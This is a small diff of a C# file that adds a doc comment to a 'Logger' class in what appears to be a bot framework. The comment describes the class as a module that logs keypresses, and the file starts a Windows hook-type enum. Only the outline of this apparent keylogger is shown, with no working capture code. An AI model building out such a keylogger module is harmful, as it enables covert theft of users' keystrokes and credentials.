@@ -1,11 +1,13 @@
 ﻿using System;
-using System.ComponentModel;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.Windows.Forms;
 using Spindle;
 
 namespace CoreModule.Modules {
+    /// <summary>
+    ///     Module that logs keypresses 
+    /// </summary>
     public class Logger : IBotModule {
         private enum HookType {
             WH_JOURNALRECORD = 0,
